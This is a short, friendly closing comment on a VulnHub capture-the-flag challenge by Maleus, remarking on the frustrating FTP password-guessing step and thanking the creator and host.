Quite fun challange! Was a bit frustrating at times, especially at the password guessing bit for FTP server, if only "Tr0ll" was one of the entries in the answer.txt file, that would save me quite some time trying to guess FTP username and password... oh well, Trolls will be Trolls :) Thanks [Maleus](https://twitter.com/maleus21) for coming up with it and [VulnHub](http://www.vulnhub.com) for hosting it!
